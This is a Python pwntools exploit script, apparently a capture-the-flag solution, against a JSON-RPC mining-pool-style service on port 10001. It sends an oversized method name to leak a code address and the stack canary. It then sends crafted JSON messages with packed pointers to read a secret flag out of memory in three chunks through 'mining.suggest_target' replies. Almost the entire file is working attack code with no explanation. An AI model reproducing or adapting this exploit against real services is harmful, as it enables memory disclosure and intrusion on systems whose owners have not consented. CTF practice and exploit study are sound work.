#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
timeout = 0.7

print sys.argv[1]
r = remote(sys.argv[1] ,10001)

if __name__ == '__main__':
  payload = '{"id":"1234","method":"client.exchange.flag","params":[222]}'
  print payload
  r.sendline(payload)
  print r.recvrepeat(timeout)
  r.sendline("{\"id\":"+"2147483648"+",\"method\":\"" + "A"*0x150 + "\",\"params\":[\"123\"]}")
  data = r.recvrepeat(timeout)

  print repr(data)

  m_addr  = u64(data[data.find('\x00')+1:data.find('\x00')+8+1]) - 0xbf1
  canary  = u64(data[data.find('\x00')+1+8:data.find('\x00')+8+1+8])

  # leak 1



  flag = m_addr + 0x1d60
  flag_ptr = m_addr + 0x2432
  flag_ptr_ptr = m_addr + 0x2448
  print("m_addr = {}".format(hex(m_addr))) 
  print("canary = {}".format(hex(canary)))
  print r.recvrepeat(timeout)


  payload = '{"id":"0","method":"DDDDDD","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
  print payload
  
  r.sendline(payload)
  print r.recvrepeat(timeout)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

  r.sendline(payload)
  data = r.recvrepeat(timeout)
  read_flag = data[data.find('set_difficulty","params":["')+len('set_difficulty","params":["'):data.find("000000000000000000000000000000000000000000000000")]

  # leak 2

  flag = m_addr + 0x1d70
  flag_ptr = m_addr + 0x2432
  flag_ptr_ptr = m_addr + 0x2448
  print r.recvrepeat(timeout)
  payload = '{"id":"0","method":"EEEEEE","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
  print payload
  
  r.sendline(payload)
  #print r.recv(0x100)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

  
  r.sendline(payload)
  data = r.recvrepeat(timeout)
  read_flag += data[data.find('set_difficulty","params":["')+len('set_difficulty","params":["'):data.find("000000000000000000000000000000000000000000000000")]

  # leak 3


  flag = m_addr + 0x1d80
  flag_ptr = m_addr + 0x2432
  flag_ptr_ptr = m_addr + 0x2448
  print r.recvrepeat(timeout)
  payload = '{"id":"0","method":"FFFFFF","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
  print payload
  
  r.sendline(payload)
  #print r.recv(0x100)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

  
  r.sendline(payload)

  data = r.recvrepeat(timeout)
  read_flag += data[data.find('set_difficulty","params":["')+len('set_difficulty","params":["'):data.find("000000000000000000000000000000000000000000000000")]
  print "BFS"*4+read_flag
  r.close()
